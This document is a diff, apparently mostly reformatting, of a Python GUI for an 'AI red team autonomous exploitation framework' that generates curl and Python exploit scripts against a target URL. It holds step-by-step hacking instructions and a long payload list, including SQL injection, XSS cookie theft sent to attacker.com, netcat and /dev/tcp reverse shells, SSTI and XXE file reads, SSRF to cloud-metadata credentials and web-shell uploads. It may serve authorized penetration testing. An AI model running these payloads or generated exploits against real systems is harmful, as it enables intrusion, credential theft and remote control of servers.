@@ -21,6 +21,7 @@ import sys
 import glob
 import json
 from datetime import datetime
+
 # Add parent directory to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -29,14 +30,16 @@ from utils.vulnerability_database import VULNERABILITY_DATABASE
 from utils.model_loader import find_latest_checkpoint
 import webbrowser
 
+
 class ToolTip(object):
     """
     create a tooltip for a given widget
     """
-    def __init__(self, widget, text='widget info'):
-        self.wait_time = 500     # miliseconds
-        self.wrap_length = 180   # pixels
-        self.widget = widget     # FIX: Assign widget to self.widget
+
+    def __init__(self, widget, text="widget info"):
+        self.wait_time = 500  # miliseconds
+        self.wrap_length = 180  # pixels
+        self.widget = widget  # FIX: Assign widget to self.widget
         self.text = text
         self.widget.bind("<Enter>", self.enter)
         self.widget.bind("<Leave>", self.leave)
@@ -71,54 +74,60 @@ class ToolTip(object):
         # Leaves only the label and removes the app window
         self.tw.wm_overrideredirect(True)
         self.tw.wm_geometry("+%d+%d" % (x, y))
-        label = tk.Label(self.tw, text=self.text, justify='left',
-                       background="#ffffff", relief='solid', borderwidth=1,
-                       wraplength = self.wrap_length)
+        label = tk.Label(
+            self.tw,
+            text=self.text,
+            justify="left",
+            background="#ffffff",
+            relief="solid",
+            borderwidth=1,
+            wraplength=self.wrap_length,
+        )
         label.pack(ipadx=1)
 
     def hidetip(self):
         tw = self.tw
-        self.tw= None
+        self.tw = None
         if tw:
             tw.destroy()
 
 
 class ExploitGenerator:
     """Generates ready-to-use exploits from vulnerability data"""
-    
+
     @staticmethod
     def generate_curl(vuln):
         """Generate a curl command for the exploit"""
-        url = vuln.get('url', 'http://target.com')
-        method = vuln.get('method', 'GET')
-        payload = vuln.get('payload', '')
-        param = vuln.get('parameter', 'q')
-        
-        if method == 'GET':
-            separator = '&' if '?' in url else '?'
-            if '=' in payload:
+        url = vuln.get("url", "http://target.com")
+        method = vuln.get("method", "GET")
+        payload = vuln.get("payload", "")
+        param = vuln.get("parameter", "q")
+
+        if method == "GET":
+            separator = "&" if "?" in url else "?"
+            if "=" in payload:
                 full_url = f"{url}{separator}{payload}"
             else:
                 full_url = f"{url}{separator}{param}={payload}"
             return f"curl -v '{full_url}'"
-        
-        elif method == 'POST':
-            if '=' in payload or '{' in payload:
+
+        elif method == "POST":
+            if "=" in payload or "{" in payload:
                 data = payload
             else:
                 data = f"{param}={payload}"
             return f"curl -v -X POST '{url}' -d '{data}'"
-            
+
         return f"# Method {method} not supported for auto-generation"
 
     @staticmethod
     def generate_python(vuln):
         """Generate a Python script for the exploit"""
-        url = vuln.get('url', 'http://target.com')
-        method = vuln.get('method', 'GET')
-        payload = vuln.get('payload', '')
-        param = vuln.get('parameter', 'q')
-        
+        url = vuln.get("url", "http://target.com")
+        method = vuln.get("method", "GET")
+        payload = vuln.get("payload", "")
+        param = vuln.get("parameter", "q")
+
         script = f"""import requests
 
 target_url = "{url}"
@@ -126,8 +135,8 @@ payload = "{payload}"
 
 print(f"[*] Exploiting {vuln.get('type', 'Vulnerability')}...")
 """
-        if method == 'GET':
-            if '=' in payload:
+        if method == "GET":
+            if "=" in payload:
                 script += f"""
 full_url = f"{{target_url}}?{{payload}}" if "?" not in target_url else f"{{target_url}}&{{payload}}"
 response = requests.get(full_url)
@@ -137,7 +146,7 @@ response = requests.get(full_url)
 params = {{'{param}': payload}}
 response = requests.get(target_url, params=params)
 """
-        elif method == 'POST':
+        elif method == "POST":
             script += f"""
 data = payload 
 response = requests.post(target_url, data=data, headers={{'Content-Type': 'application/x-www-form-urlencoded'}})
@@ -154,64 +163,64 @@ else:
     @staticmethod
     def get_steps(vuln):
         """Get step-by-step hacking instructions"""
-        v_type = vuln.get('type', 'Unknown')
-        
+        v_type = vuln.get("type", "Unknown")
+
         steps = {
-            'SQL': [
+            "SQL": [
                 "1. Identify the vulnerable parameter.",
                 "2. Inject SQL payload to manipulate query.",
                 "3. Check for database errors or data leakage.",
-                "4. Dump database with UNION SELECT."
+                "4. Dump database with UNION SELECT.",
             ],
-            'XSS': [
+            "XSS": [
                 "1. Find reflection point.",
                 "2. Inject script payload.",
                 "3. Verify execution (alert box).",
-                "4. Steal cookies or redirect users."
+                "4. Steal cookies or redirect users.",
             ],
-            'OSINT': [
+            "OSINT": [
                 "1. Analyze the exposed file.",
                 "2. Look for secrets, keys, or config data.",
-                "3. Use data to pivot to other systems."
+                "3. Use data to pivot to other systems.",
             ],
-            'Upload': [
+            "Upload": [
                 "1. Upload a malicious file (e.g., PHP shell).",
                 "2. Access the file via the web server.",
-                "3. Execute commands on the server."
+                "3. Execute commands on the server.",
             ],
-            'Prototype': [
+            "Prototype": [
                 "1. Inject __proto__ or constructor payload.",
                 "2. Check if object properties are modified.",
-                "3. Escalate to RCE or DoS."
+                "3. Escalate to RCE or DoS.",
             ],
-            'XXE': [
+            "XXE": [
                 "1. Inject XML with DOCTYPE definition.",
                 "2. Reference external entity (e.g., /etc/passwd).",
-                "3. Check response for file content."
+                "3. Check response for file content.",
             ],
-            'SSRF': [
+            "SSRF": [
                 "1. Inject internal URL (localhost, 127.0.0.1).",
                 "2. Check if server fetches the internal resource.",
-                "3. Scan internal ports or metadata services."
+                "3. Scan internal ports or metadata services.",
             ],
-            'Deserialization': [
+            "Deserialization": [
                 "1. Identify serialized object (base64, etc.).",
                 "2. Generate malicious object (ysoserial).",
-                "3. Inject and execute code."
-            ]
+                "3. Inject and execute code.",
+            ],
         }
-        
+
         for key in steps:
             if key.lower() in v_type.lower():
                 return "\n".join(steps[key])
-                
+
         return "1. Analyze request.\n2. Replay with payload.\n3. Verify impact.\n4. Report finding."
 
     @staticmethod
     def get_suggested_payloads(vuln_type):
         """Returns a list of payloads to try manually."""
         payloads = {
-            'SQL': [
+            "SQL": [
                 "' OR 1=1 --",
                 "' OR '1'='1",
                 "admin' --",
@@ -226,12 +235,12 @@ else:
                 "' UNION SELECT username, password FROM users--",
                 "admin'/*",
                 "' OR 1=1#",
-                "1' AND extractvalue(1,concat(0x7e,version()))--"
+                "1' AND extractvalue(1,concat(0x7e,version()))--",
             ],
-            'XSS': [
+            "XSS": [
                 "<script>alert('XSS')</script>",
                 "<img src=x onerror=alert(1)>",
-                "\"><script>alert(1)</script>",
+                '"><script>alert(1)</script>',
                 "javascript:alert(1)",
                 "<svg/onload=alert(1)>",
                 "<iframe src=javascript:alert(1)>",
@@ -243,12 +252,12 @@ else:
                 "<details open ontoggle=alert(1)>",
                 "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>",
                 "'-alert(1)-'",
-                "\";alert(1);//",
+                '";alert(1);//',
                 "<script>eval(atob('YWxlcnQoMSk='))</script>",
                 "{{constructor.constructor('alert(1)')()}}",
-                "<img src=x:alert(1) onerror=eval(src)>"
+                "<img src=x:alert(1) onerror=eval(src)>",
             ],
-            'LFI': [
+            "LFI": [
                 "../../../../etc/passwd",
                 "....//....//....//etc/passwd",
                 "php://filter/convert.base64-encode/resource=index.php",
@@ -262,9 +271,9 @@ else:
                 "php://filter/read=string.rot13/resource=index.php",
                 "/proc/self/environ",
                 "/var/log/apache2/access.log",
-                "....//....//....//var/www/html/config.php"
+                "....//....//....//var/www/html/config.php",
             ],
-            'Command': [
+            "Command": [
                 "; id",
                 "| whoami",
                 "$(cat /etc/passwd)",
@@ -277,9 +286,9 @@ else:
                 "| nc attacker.com 4444 -e /bin/bash",
                 "; curl http://attacker.com/$(whoami)",
                 "& powershell -c Get-Process",
-                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
             ],
-            'SSTI': [
+            "SSTI": [
                 "{{7*7}}",
                 "${7*7}",
                 "<%= 7*7 %>",
@@ -291,26 +300,26 @@ else:
                 "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                 "{{config.items()}}",
                 "{{''.class.mro()[1].subclasses()}}",
-                "{{request.environ}}"
+                "{{request.environ}}",
             ],
-            'Prototype': [
+            "Prototype": [
                 "__proto__[admin]=true",
                 "constructor[prototype][isAdmin]=true",
                 "__proto__.polluted=true",
                 "constructor.prototype.admin=true",
                 "__proto__[role]=admin",
                 "?__proto__[admin]=true",
-                "{\"__proto__\":{\"admin\":true}}",
-                "constructor[prototype][authenticated]=true"
+                '{"__proto__":{"admin":true}}',
+                "constructor[prototype][authenticated]=true",
             ],
-            'XXE': [
+            "XXE": [
                 "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                 "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
                 "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe'>]><foo>&xxe;</foo>",
                 "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>",
-                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>"
+                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
             ],
-            'SSRF': [
+            "SSRF": [
                 "http://localhost:80",
                 "http://127.0.0.1:22",
                 "http://169.254.169.254/latest/meta-data/",
@@ -321,66 +330,66 @@ else:
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 "file:///etc/passwd",
                 "gopher://127.0.0.1:6379/_FLUSHALL",
-                "dict://localhost:11211/stat"
+                "dict://localhost:11211/stat",
             ],
-            'Deserialization': [
+            "Deserialization": [
                 "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldL... (Java)",
                 "Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUi... (PHP)",
                 "YToxOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO30= (PHP Base64)",
                 "Use ysoserial for Java payloads",
-                "Use phpggc for PHP gadget chains"
+                "Use phpggc for PHP gadget chains",
             ],
-            'CSRF': [
+            "CSRF": [
                 "<html><form action='http://target/change' method='POST'><input name='password' value='hacked'/></form><script>document.forms[0].submit()</script></html>",
                 "<img src='http://target/delete?id=1'>",
-                "<iframe src='http://target/admin/deleteUser?id=1'></iframe>"
+                "<iframe src='http://target/admin/deleteUser?id=1'></iframe>",
             ],
-            'Path': [
+            "Path": [
                 "../../../../etc/passwd",
                 "..\\..\\..\\windows\\win.ini",
                 "....//....//etc/passwd",
                 "..%2F..%2F..%2Fetc%2Fpasswd",
                 "..%252F..%252F..%252Fetc%252Fpasswd",
-                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
             ],
-            'IDOR': [
+            "IDOR": [
                 "?id=1 (try id=2, id=999, id=admin)",
                 "?user_id=123 (try other IDs)",
                 "?document=abc123 (try other UUIDs)",
-                "/api/users/1 (try /api/users/2)"
+                "/api/users/1 (try /api/users/2)",
             ],
-            'Upload': [
+            "Upload": [
                 "shell.php (PHP web shell)",
                 "shell.jsp (Java web shell)",
                 "shell.aspx (ASP.NET web shell)",
                 "image.php.jpg (double extension)",
                 "shell.php%00.jpg (null byte)",
-                "Use polyglot files (valid image + PHP code)"
+                "Use polyglot files (valid image + PHP code)",
             ],
-            'NoSQL': [
+            "NoSQL": [
                 "{'$ne': null}",
                 "{'$gt': ''}",
                 "admin' || '1'=='1",
                 "{'$regex': '.*'}",
-                "{'username': {'$ne': null}, 'password': {'$ne': null}}"
+                "{'username': {'$ne': null}, 'password': {'$ne': null}}",
             ],
-            'LDAP': [
+            "LDAP": [
                 "*",
                 "admin)(&(password=*))",
                 "*)(&(objectClass=*)",
-                "admin)(|(password=*))"
+                "admin)(|(password=*))",
             ],
-            'OAuth': [
+            "OAuth": [
                 "redirect_uri=http://attacker.com",
                 "response_type=token",
-                "state= (CSRF token bypass)"
-            ]
+                "state= (CSRF token bypass)",
+            ],
         }
-        
+
         for key, p_list in payloads.items():
             if key.lower() in vuln_type.lower():
                 return "\n".join([f"- {p}" for p in p_list])
-        
+
         return "- (No specific payloads available for this type)"
 
 
@@ -389,159 +398,282 @@ class SecurityScannerGUI:
         self.root = root
         self.root.title("💀 DRL AI RED TEAM - AGENT 2.0 (OWASP 2025)")
         self.root.geometry("1920x1080")  # Increased default size
-        self.root.minsize(1280, 720)    # Increased minimum size to prevent content cutoff
-        
+        self.root.minsize(1280, 720)  # Increased minimum size to prevent content cutoff
+
         # Modern Security Suite Theme
         self.colors = {
-            "bg_dark": "#08080C",      # Midnight Dark
-            "bg_panel": "#12121A",     # Deep Cobalt Dark
-            "accent": "#00E5FF",       # Electric Cyan
-            "accent_dim": "#00B8D4",   # Dim Cyan
-            "text": "#E0E0E0",         # Off-White Text
-            "text_dim": "#90A4AE",     # Blue-Grey Text
-            "danger": "#FF1744",       # Modern Red
-            "warning": "#FFC400",      # Amber
-            "success": "#00C853",      # Emerald Green
-            "highlight": "#1C1C26"     # Subtle Highlight
+            "bg_dark": "#08080C",  # Midnight Dark
+            "bg_panel": "#12121A",  # Deep Cobalt Dark
+            "accent": "#00E5FF",  # Electric Cyan
+            "accent_dim": "#00B8D4",  # Dim Cyan
+            "text": "#E0E0E0",  # Off-White Text
+            "text_dim": "#90A4AE",  # Blue-Grey Text
+            "danger": "#FF1744",  # Modern Red
+            "warning": "#FFC400",  # Amber
+            "success": "#00C853",  # Emerald Green
+            "highlight": "#1C1C26",  # Subtle Highlight
         }
-        
+
         self.root.configure(bg=self.colors["bg_dark"])
-        
+
         # Variables
         self.target_url = tk.StringVar(value="http://localhost:5002")
         self.crawl_depth = tk.IntVar(value=30)
         self.test_episodes = tk.IntVar(value=3)
         # Find latest model automatically
         latest_ep, latest_model_path = find_latest_checkpoint()
-        default_model = latest_model_path if latest_model_path else "checkpoints/improved_mock_ep500.pth"
-        
+        default_model = (
+            latest_model_path
+            if latest_model_path
+            else "checkpoints/improved_mock_ep500.pth"
+        )
+
         self.model_path = tk.StringVar(value=default_model)
-        self.persist_mode = tk.BooleanVar(value=True) # Default to Persistence Mode
-        
+        self.persist_mode = tk.BooleanVar(value=True)  # Default to Persistence Mode
+
         self.setup_ui()
         self.load_available_models()
         self.auditor = None
 
-        
     def setup_ui(self):
         """Setup the Cyberpunk UI with Responsive Layout"""
-        
+
         # Custom Style for Progress Bar
         style = ttk.Style()
-        style.theme_use('clam')
-        style.configure("Horizontal.TProgressbar", foreground=self.colors['accent'], background=self.colors['accent'], troughcolor=self.colors['bg_panel'], bordercolor=self.colors['bg_panel'], lightcolor=self.colors['accent'], darkcolor=self.colors['accent'])
-        
+        style.theme_use("clam")
+        style.configure(
+            "Horizontal.TProgressbar",
+            foreground=self.colors["accent"],
+            background=self.colors["accent"],
+            troughcolor=self.colors["bg_panel"],
+            bordercolor=self.colors["bg_panel"],
+            lightcolor=self.colors["accent"],
+            darkcolor=self.colors["accent"],
+        )
+
         # Header
         header_frame = tk.Frame(self.root, bg=self.colors["bg_dark"], height=70)
         header_frame.pack(fill=tk.X, padx=0, pady=0)
         header_frame.pack_propagate(False)
-        
+
         title_label = tk.Label(
             header_frame,
             text="DRL AI RED TEAM",
             font=("Segoe UI", 24, "bold"),
             bg=self.colors["bg_dark"],
-            fg=self.colors["accent"]
+            fg=self.colors["accent"],
         )
         title_label.pack(side=tk.LEFT, padx=20, pady=10)
-        
+
         subtitle_label = tk.Label(
             header_frame,
             text="AUTONOMOUS EXPLOITATION FRAMEWORK",
             font=("Segoe UI", 10, "bold"),
             bg=self.colors["bg_dark"],
-            fg=self.colors["text_dim"]
+            fg=self.colors["text_dim"],
         )
         subtitle_label.pack(side=tk.LEFT, pady=10)
-        
+
         # Status Bar (Top Right)
         self.status_var = tk.StringVar()
         self.status_var.set("SYSTEM READY")
-        self.status_label = tk.Label(header_frame, textvariable=self.status_var, font=("Consolas", 10), bg=self.colors["bg_dark"], fg=self.colors["accent"])
+        self.status_label = tk.Label(
+            header_frame,
+            textvariable=self.status_var,
+            font=("Consolas", 10),
+            bg=self.colors["bg_dark"],
+            fg=self.colors["accent"],
+        )
         self.status_label.pack(side=tk.RIGHT, padx=20)
 
         # Main Layout - PanedWindow for Resizability
-        main_pane = tk.PanedWindow(self.root, bg=self.colors["bg_dark"], orient=tk.HORIZONTAL, sashwidth=4, sashrelief=tk.FLAT)
+        main_pane = tk.PanedWindow(
+            self.root,
+            bg=self.colors["bg_dark"],
+            orient=tk.HORIZONTAL,
+            sashwidth=4,
+            sashrelief=tk.FLAT,
+        )
         main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-        
+
         # === LEFT: MISSION CONTROL (Scrollable) ===
         left_container = tk.Frame(main_pane, bg=self.colors["bg_panel"])
         main_pane.add(left_container, minsize=320, width=350)
-        
+
         # Canvas for scrolling
-        self.canvas = tk.Canvas(left_container, bg=self.colors["bg_panel"], highlightthickness=0)
-        self.scrollbar = ttk.Scrollbar(left_container, orient="vertical", command=self.canvas.yview)
+        self.canvas = tk.Canvas(
+            left_container, bg=self.colors["bg_panel"], highlightthickness=0
+        )
+        self.scrollbar = ttk.Scrollbar(
+            left_container, orient="vertical", command=self.canvas.yview
+        )
         self.scrollable_frame = tk.Frame(self.canvas, bg=self.colors["bg_panel"])
-        
+
         self.scrollable_frame.bind(
             "<Configure>",
-            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
+            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")),
         )
-        
+
         # Create window without fixed width - will resize dynamically
-        self.canvas_window = self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
-        
+        self.canvas_window = self.canvas.create_window(
+            (0, 0), window=self.scrollable_frame, anchor="nw"
+        )
+
         # Bind canvas resize to update scrollable frame width
         def on_canvas_resize(event):
             self.canvas.itemconfig(self.canvas_window, width=event.width)
-        
+
         self.canvas.bind("<Configure>", on_canvas_resize)
         self.canvas.configure(yscrollcommand=self.scrollbar.set)
-        
+
         # Enable mousewheel scrolling
         def on_mousewheel(event):
-            self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")
-        
+            self.canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
+
         self.canvas.bind_all("<MouseWheel>", on_mousewheel)
-        
+
         self.canvas.pack(side="left", fill="both", expand=True)
         self.scrollbar.pack(side="right", fill="y")
-        
+
         # --- Control Widgets in Scrollable Frame ---
         self.add_section_header(self.scrollable_frame, "MISSION PARAMETERS")
-        self.create_input_field(self.scrollable_frame, "TARGET URL:", self.target_url, "http://localhost:5002")
-        self.create_slider_field(self.scrollable_frame, "CRAWL DEPTH:", self.crawl_depth, 0, 100, 30, "0 = Only target URL (no crawl), 30 for new sites, 100+ for deep scan")
-        self.create_slider_field(self.scrollable_frame, "ATTACK INTENSITY:", self.test_episodes, 1, 50, 10, "Rec: 2 for new sites, 3 standard, 5 aggressive, 20+ for deep skill check")
+        self.create_input_field(
+            self.scrollable_frame,
+            "TARGET URL:",
+            self.target_url,
+            "http://localhost:5002",
+        )
+        self.create_slider_field(
+            self.scrollable_frame,
+            "CRAWL DEPTH:",
+            self.crawl_depth,
+            0,
+            100,
+            30,
+            "0 = Only target URL (no crawl), 30 for new sites, 100+ for deep scan",
+        )
+        self.create_slider_field(
+            self.scrollable_frame,
+            "ATTACK INTENSITY:",
+            self.test_episodes,
+            1,
+            50,
+            10,
+            "Rec: 2 for new sites, 3 standard, 5 aggressive, 20+ for deep skill check",
+        )
         self.create_model_selector(self.scrollable_frame)
-        
+
         # Persistence Checkbox
         persist_frame = tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"])
         persist_frame.pack(pady=5, padx=15, fill=tk.X)
-        tk.Checkbutton(persist_frame, text="ENABLE PERSISTENCE MODE (Retry until found)", variable=self.persist_mode, 
-                      bg=self.colors["bg_panel"], fg=self.colors["accent"], selectcolor=self.colors["bg_dark"], 
-                      activebackground=self.colors["bg_panel"], activeforeground=self.colors["accent"], font=("Segoe UI", 9, "bold")).pack(anchor=tk.W)
-        
+        tk.Checkbutton(
+            persist_frame,
+            text="ENABLE PERSISTENCE MODE (Retry until found)",
+            variable=self.persist_mode,
+            bg=self.colors["bg_panel"],
+            fg=self.colors["accent"],
+            selectcolor=self.colors["bg_dark"],
+            activebackground=self.colors["bg_panel"],
+            activeforeground=self.colors["accent"],
+            font=("Segoe UI", 9, "bold"),
+        ).pack(anchor=tk.W)
+
         # Pentester Mode Checkbox (Chain Attacks)
         self.pentester_mode = tk.BooleanVar(value=False)
-        tk.Checkbutton(persist_frame, text="ENABLE CHAIN ATTACKS (Pentester Mode)", variable=self.pentester_mode, 
-                      bg=self.colors["bg_panel"], fg="#FF00FF", selectcolor=self.colors["bg_dark"], 
-                      activebackground=self.colors["bg_panel"], activeforeground="#FF00FF", font=("Segoe UI", 9, "bold")).pack(anchor=tk.W)
-        
-        tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"], height=20).pack() # Spacer
-        
+        tk.Checkbutton(
+            persist_frame,
+            text="ENABLE CHAIN ATTACKS (Pentester Mode)",
+            variable=self.pentester_mode,
+            bg=self.colors["bg_panel"],
+            fg="#FF00FF",
+            selectcolor=self.colors["bg_dark"],
+            activebackground=self.colors["bg_panel"],
+            activeforeground="#FF00FF",
+            font=("Segoe UI", 9, "bold"),
+        ).pack(anchor=tk.W)
+
+        tk.Frame(
+            self.scrollable_frame, bg=self.colors["bg_panel"], height=20
+        ).pack()  # Spacer
+
         # ONE CLICK BUTTONS
-        self.flash_btn = tk.Button(self.scrollable_frame, text="FLASH ATTACK (ONE-CLICK)", font=("Segoe UI", 12, "bold"), bg=self.colors["accent"], fg="#000000", activebackground="#FFFFFF", activeforeground="#000000", relief=tk.FLAT, cursor="hand2", command=self.flash_attack, height=2)
+        self.flash_btn = tk.Button(
+            self.scrollable_frame,
+            text="FLASH ATTACK (ONE-CLICK)",
+            font=("Segoe UI", 12, "bold"),
+            bg=self.colors["accent"],
+            fg="#000000",
+            activebackground="#FFFFFF",
+            activeforeground="#000000",
+            relief=tk.FLAT,
+            cursor="hand2",
+            command=self.flash_attack,
+            height=2,
+        )
         self.flash_btn.pack(pady=5, padx=15, fill=tk.X)
-        
-        self.scan_button = tk.Button(self.scrollable_frame, text="HYBRID SCAN (Standard)", font=("Segoe UI", 11, "bold"), bg=self.colors["highlight"], fg=self.colors["accent"], relief=tk.FLAT, cursor="hand2", command=self.start_scan, height=2)
-        ToolTip(self.scan_button, "Hybrid Mode: Fast Script Recon + AI Verification (Balanced)")
+
+        self.scan_button = tk.Button(
+            self.scrollable_frame,
+            text="HYBRID SCAN (Standard)",
+            font=("Segoe UI", 11, "bold"),
+            bg=self.colors["highlight"],
+            fg=self.colors["accent"],
+            relief=tk.FLAT,
+            cursor="hand2",
+            command=self.start_scan,
+            height=2,
+        )
+        ToolTip(
+            self.scan_button,
+            "Hybrid Mode: Fast Script Recon + AI Verification (Balanced)",
+        )
         self.scan_button.pack(pady=5, padx=15, fill=tk.X)
-        
-        self.scan_ai_button = tk.Button(self.scrollable_frame, text="FULL AI SCAN (Unleashed)", font=("Segoe UI", 11, "bold"), bg="#6200ea", fg="white", relief=tk.FLAT, cursor="hand2", command=lambda: self.start_scan(ai_mode=True, pentester=True), height=2)
-        ToolTip(self.scan_ai_button, "Full AI Mode: AI Recon + Chain Attacks + Online Learning (Maximum Power)")
+
+        self.scan_ai_button = tk.Button(
+            self.scrollable_frame,
+            text="FULL AI SCAN (Unleashed)",
+            font=("Segoe UI", 11, "bold"),
+            bg="#6200ea",
+            fg="white",
+            relief=tk.FLAT,
+            cursor="hand2",
+            command=lambda: self.start_scan(ai_mode=True, pentester=True),
+            height=2,
+        )
+        ToolTip(
+            self.scan_ai_button,
+            "Full AI Mode: AI Recon + Chain Attacks + Online Learning (Maximum Power)",
+        )
         self.scan_ai_button.pack(pady=5, padx=15, fill=tk.X)
-        
-        self.stop_button = tk.Button(self.scrollable_frame, text="ABORT MISSION", font=("Segoe UI", 11, "bold"), bg=self.colors["danger"], fg="white", relief=tk.FLAT, cursor="hand2", command=self.stop_scan, height=2, state=tk.DISABLED)
+
+        self.stop_button = tk.Button(
+            self.scrollable_frame,
+            text="ABORT MISSION",
+            font=("Segoe UI", 11, "bold"),
+            bg=self.colors["danger"],
+            fg="white",
+            relief=tk.FLAT,
+            cursor="hand2",
+            command=self.stop_scan,
+            height=2,
+            state=tk.DISABLED,
+        )
         self.stop_button.pack(pady=(5, 15), padx=15, fill=tk.X)
-        
+
         # === MIDDLE: TERMINAL & INTEL ===
         middle_panel = tk.Frame(main_pane, bg=self.colors["bg_panel"])
         main_pane.add(middle_panel, minsize=400, width=500)
-        
+
         # Split Middle Panel Vertically
-        middle_pane_vertical = tk.PanedWindow(middle_panel, bg=self.colors["bg_panel"], orient=tk.VERTICAL, sashwidth=4, sashrelief=tk.FLAT)
+        middle_pane_vertical = tk.PanedWindow(
+            middle_panel,
+            bg=self.colors["bg_panel"],
+            orient=tk.VERTICAL,
+            sashwidth=4,
+            sashrelief=tk.FLAT,
+        )
         middle_pane_vertical.pack(fill=tk.BOTH, expand=True)
-        
+
         # Terminal Section (Now wrapped in a Notebook)
         terminal_notebook = ttk.Notebook(middle_pane_vertical)
         middle_pane_vertical.add(terminal_notebook, minsize=200, height=300)
@@ -549,80 +681,175 @@ class SecurityScannerGUI:
         # Tab 1: Terminal
         terminal_frame = tk.Frame(terminal_notebook, bg=self.colors["bg_panel"])
         terminal_notebook.add(terminal_frame, text="LOGS & TERMINAL")
-        
+
         self.add_section_header(terminal_frame, "LIVE ACTION TERMINAL")
-        self.progress = ttk.Progressbar(terminal_frame, mode='indeterminate', style="Horizontal.TProgressbar")
+        self.progress = ttk.Progressbar(
+            terminal_frame, mode="indeterminate", style="Horizontal.TProgressbar"
+        )
         self.progress.pack(pady=5, padx=15, fill=tk.X)
-        
-        self.output_text = scrolledtext.ScrolledText(terminal_frame, wrap=tk.WORD, font=("Consolas", 9), bg="black", fg=self.colors["text"], relief=tk.FLAT, insertbackground=self.colors["accent"])
+
+        self.output_text = scrolledtext.ScrolledText(
+            terminal_frame,
+            wrap=tk.WORD,
+            font=("Consolas", 9),
+            bg="black",
+            fg=self.colors["text"],
+            relief=tk.FLAT,
+            insertbackground=self.colors["accent"],
+        )
         self.output_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
 
         # Tab 2: Live View (AI Vision)
         live_view_frame = tk.Frame(terminal_notebook, bg=self.colors["bg_panel"])
         terminal_notebook.add(live_view_frame, text="LIVE VIEW (AI VISION)")
-        
+
         self.add_section_header(live_view_frame, "REAL-TIME AGENT PERCEPTION")
-        
-        self.live_view_text = scrolledtext.ScrolledText(live_view_frame, wrap=tk.NONE, font=("Consolas", 8), bg="#1e1e1e", fg="#00ff00", relief=tk.FLAT, insertbackground="white")
+
+        self.live_view_text = scrolledtext.ScrolledText(
+            live_view_frame,
+            wrap=tk.NONE,
+            font=("Consolas", 8),
+            bg="#1e1e1e",
+            fg="#00ff00",
+            relief=tk.FLAT,
+            insertbackground="white",
+        )
         self.live_view_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
         self.live_view_text.insert(tk.END, "Waiting for agent visual input...\n")
-        
+
         # Findings Section
-        findings_frame_container = tk.Frame(middle_pane_vertical, bg=self.colors["bg_panel"])
+        findings_frame_container = tk.Frame(
+            middle_pane_vertical, bg=self.colors["bg_panel"]
+        )
         middle_pane_vertical.add(findings_frame_container, minsize=200)
-        
+
         self.add_section_header(findings_frame_container, "THREAT DETECTION ENGINE")
-        
+
         findings_list_frame = tk.Frame(findings_frame_container, bg="black")
         findings_list_frame.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
-        
+
         scrollbar_findings = tk.Scrollbar(findings_list_frame)
         scrollbar_findings.pack(side=tk.RIGHT, fill=tk.Y)
-        
-        self.findings_list = tk.Listbox(findings_list_frame, font=("Consolas", 10), bg="black", fg=self.colors["warning"], selectbackground=self.colors["accent"], selectforeground="black", relief=tk.FLAT, yscrollcommand=scrollbar_findings.set)
+
+        self.findings_list = tk.Listbox(
+            findings_list_frame,
+            font=("Consolas", 10),
+            bg="black",
+            fg=self.colors["warning"],
+            selectbackground=self.colors["accent"],
+            selectforeground="black",
+            relief=tk.FLAT,
+            yscrollcommand=scrollbar_findings.set,
+        )
         self.findings_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
         scrollbar_findings.config(command=self.findings_list.yview)
-        
-        self.findings_list.bind('<<ListboxSelect>>', self.on_finding_select)
-        
+
+        self.findings_list.bind("<<ListboxSelect>>", self.on_finding_select)
+
         # === RIGHT: WEAPONIZATION ===
         right_panel = tk.Frame(main_pane, bg=self.colors["bg_panel"])
         main_pane.add(right_panel, minsize=350, width=400)
-        
+
         self.add_section_header(right_panel, "WEAPONIZATION MODULE")
-        
-        self.exploit_text = scrolledtext.ScrolledText(right_panel, wrap=tk.WORD, font=("Consolas", 10), bg="black", fg=self.colors["danger"], relief=tk.FLAT, insertbackground="white")
+
+        self.exploit_text = scrolledtext.ScrolledText(
+            right_panel,
+            wrap=tk.WORD,
+            font=("Consolas", 10),
+            bg="black",
+            fg=self.colors["danger"],
+            relief=tk.FLAT,
+            insertbackground="white",
+        )
         self.exploit_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
-        self.exploit_text.insert(tk.END, "// Select a vulnerability to generate exploit payload...")
-        
+        self.exploit_text.insert(
+            tk.END, "// Select a vulnerability to generate exploit payload..."
+        )
+
         btn_frame = tk.Frame(right_panel, bg=self.colors["bg_panel"])
